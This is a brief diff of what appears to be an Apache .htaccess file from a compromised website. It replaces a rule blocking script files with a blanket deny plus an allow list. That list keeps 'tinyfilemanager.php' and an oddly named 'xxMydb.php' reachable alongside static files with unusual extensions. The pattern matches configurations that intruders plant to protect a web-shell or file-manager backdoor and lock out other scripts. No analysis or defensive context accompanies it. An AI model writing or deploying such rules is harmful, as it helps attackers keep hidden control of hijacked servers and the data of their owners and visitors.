@@ -1,8 +1,8 @@
-
-<FilesMatch ".(py|inc|shtml|html|ph|phtml|exe|php)$">
-Order allow,deny
+Order deny,allow
 Deny from all
-</FilesMatch>
+<Files ~ ".(seer|pp|psd|kem|xml|css|jpg|jpe?g|png|gif|js)$">
+Allow from all
+</Files> 
 <FilesMatch "^(index.php|xxMydb.php|template.php|tinyfilemanager.php|url.css|index.html|xxMydb.php)$">
 Order allow,deny
 Allow from all
